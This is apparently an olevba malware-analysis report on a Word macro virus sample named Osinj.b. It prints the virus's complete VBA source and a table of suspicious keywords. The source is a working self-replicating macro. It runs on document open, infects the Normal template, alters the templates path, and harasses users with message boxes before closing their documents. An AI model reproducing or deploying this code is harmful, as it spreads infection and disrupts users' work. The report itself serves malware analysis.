olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Osinj.b-f26ef467e83bcf24b744bfee09685d867f3e7a10
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Osinj.cls 
in file: Virus.MSWord.Osinj.b-f26ef467e83bcf24b744bfee09685d867f3e7a10 - OLE stream: 'Macros/VBA/Osinj'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open()
'
' Âñå òàêè äîáðàëàñÿ, ñâîëî÷?! À øîá òåáå êà÷êà êîïíóëà çàäíüîþ íîãîþ!
' For not ukrainers: Fuck you. From Ukraine!
'
If ActiveDocument.Path <> "" _
        And ActiveDocument.Name <> "Normal.doc" And ActiveDocument.Name _
        <> "Normal.dot" And InStr(2, Options.DefaultFilePath(wdUserTemplatesPath), _
        "\normal", 1) <> 0 And Osinj = "Normal.dot" Then
    SName$ = ActiveDocument.Name
    SPath$ = ActiveDocument.Path
    Selection.WholeStory
    Selection.Copy
    Vesna.Two
    ChangeFileOpenDirectory Path:=ActiveDocument.Path
    Vesna.Three
    ChangeFileOpenDirectory _
        Options.DefaultFilePath(wdUserTemplatesPath)
    Documents.Open FileName:="Normal.doc", ConfirmConversions:=False, ReadOnly _
        :=False, AddToRecentFiles:=False, PasswordDocument:="", PasswordTemplate _
        :="mark", Revert:=False, WritePasswordDocument:="", WritePasswordTemplate:="" _
        , Format:=wdOpenFormatAuto
    Selection.Paste
    aa% = 1
    bb% = 1
    cc% = 1
    dd% = 1
    ChangeFileOpenDirectory Path:=SPath
    If Documents.Count > 0 Then
      ActiveDocument.SaveAs FileName:=SName, FileFormat:= _
        wdFormatDocument, LockComments:=False, Password:="", AddToRecentFiles:= _
        True, WritePassword:="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:= _
        False, SaveNativePictureFormat:=False, SaveFormsData:=False, _
        SaveAsAOCELetter:=False
    End If
    If Date > _
        FileDateTime(Options.DefaultFilePath(wdUserTemplatesPath) + "\Normal2.doc") + 10 Then
        Do
        aa = MsgBox("Are you down?", vbQuestion Or vbYesNo, "Osinj")
        If aa = 7 Then
            bb = MsgBox("Are you sure?", vbDefaultButton2 Or vbQuestion Or vbYesNo, "Osinj")
            If bb = 6 Then
                MsgBox "Ms Word works for downs only.", vbInformation
                Selection.TypeText Text:="d"
                Selection.MoveLeft Unit:=wdCharacter, Count:=1
                Selection.MoveRight Unit:=wdCharacter, Count:=1, Extend:=wdExtend
                Selection.Cut
                For cc = 1 To Documents.Count
                    Vesna.Four (cc)
                    aa = 6
                Next cc
            Interaction.SendKeys "%{F4}"
            End If
        End If
        Loop While aa = 7
    End If
ElseIf Osinj <> "Normal.dot" And Osinj <> "" Then
''---------------------------------------''
    b$ = "False"
    On Error GoTo ErrLabel
    SourceName$ = ActiveDocument.Name
    c$ = "Normal.doc"
    Windows(c).Activate
    If b = "True" Or ActiveDocument.Name = c Then
        Varriable = Options.DefaultFilePath(wdUserTemplatesPath)
        If InStr(2, Options.DefaultFilePath(wdUserTemplatesPath), "\normal", 1) = 0 Then
            werh = True
            Selection.WholeStory
            Selection.Delete
            SourcePath$ = ActiveDocument.Path
            ChangeFileOpenDirectory Path:=Options.DefaultFilePath(Path:=wdUserTemplatesPath)
            If Dir("Normal", vbDirectory) = "" Then
                MkDir Path:="Normal"
            End If
            ChangeFileOpenDirectory Path:=Options.DefaultFilePath(Path:=wdUserTemplatesPath) + "\Normal"
            ActiveDocument.SaveAs FileName:="Normal2.doc", FileFormat:= _
                wdFormatDocument, LockComments:=False, Password:="", AddToRecentFiles:= _
                True, WritePassword:="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:= _
                False, SaveNativePictureFormat:=False, SaveFormsData:=False, _
            SaveAsAOCELetter:=False
            ActiveDocument.SaveAs FileName:="Normal.doc", FileFormat:= _
                wdFormatDocument, LockComments:=False, Password:="", AddToRecentFiles:= _
                True, WritePassword:="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:= _
                False, SaveNativePictureFormat:=False, SaveFormsData:=False, _
            SaveAsAOCELetter:=False
            ChangeFileOpenDirectory Path:=SourcePath
            Documents.Open FileName:=SourceName, ConfirmConversions:=False, ReadOnly:= _
                False, AddToRecentFiles:=False, PasswordDocument:="", PasswordTemplate:= _
                "", Revert:=False, WritePasswordDocument:="", WritePasswordTemplate:="", _
                Format:=wdOpenFormatAuto
            ChangeFileOpenDirectory Path:=Options.DefaultFilePath(Path:=wdUserTemplatesPath) + "\Normal"
            ActiveDocument.SaveAs FileName:="Normal.dot", FileFormat:= _
                wdFormatTemplate, LockComments:=False, Password:="", AddToRecentFiles:= _
                True, WritePassword:="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:= _
                False, SaveNativePictureFormat:=False, SaveFormsData:=False, _
                SaveAsAOCELetter:=False
            Options.DefaultFilePath(wdUserTemplatesPath) = Options.DefaultFilePath(wdUserTemplatesPath) + "\Normal"
            ActiveDocument.Save
            ActiveDocument.Close
            ActiveDocument.Save
            ChangeFileOpenDirectory Path:=SourcePath
            Documents.Open FileName:=SourceName, ConfirmConversions:=False, ReadOnly:= _
                False, AddToRecentFiles:=False, PasswordDocument:="", PasswordTemplate:= _
                "", Revert:=False, WritePasswordDocument:="", WritePasswordTemplate:="", _
                Format:=wdOpenFormatAuto
            Windows("Normal.doc").Activate
            ActiveWindow.Close
        End If
    End If
''---------------------------------------''
    End If
ErrLabel:
    Select Case Err.Number
        Case Is = 5941
        b = "True"
        If c = "Normal.doc" Then
        c = "Normal.dot"
        Else
        c = SourceName
        End If
        Err.Clear
        Resume
    End Select
End Sub


-------------------------------------------------------------------------------
VBA MACRO Vesna.bas 
in file: Virus.MSWord.Osinj.b-f26ef467e83bcf24b744bfee09685d867f3e7a10 - OLE stream: 'Macros/VBA/Vesna'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub One()
    ActiveWindow.Close True
End Sub
Sub Two()
    Selection.Cut
End Sub
Sub Three()
    ActiveWindow.Close False
End Sub
Sub Four(f)
    If ActiveDocument.Path = "" Then
      MsgBox "You can find this document in folder " _
        + Options.DefaultFilePath(wdUserTemplatesPath), vbInformation
      ChangeFileOpenDirectory Path:=Options.DefaultFilePath(Path:=wdUserTemplatesPath)
      ActiveDocument.SaveAs FileName:=ActiveDocument.Name, FileFormat:= _
        wdFormatDocument, LockComments:=False, Password:="", AddToRecentFiles:= _
        True, WritePassword:="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:= _
        False, SaveNativePictureFormat:=False, SaveFormsData:=False, _
        SaveAsAOCELetter:=False
    Else
      ActiveDocument.Save
    End If
    ActiveDocument.Close
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

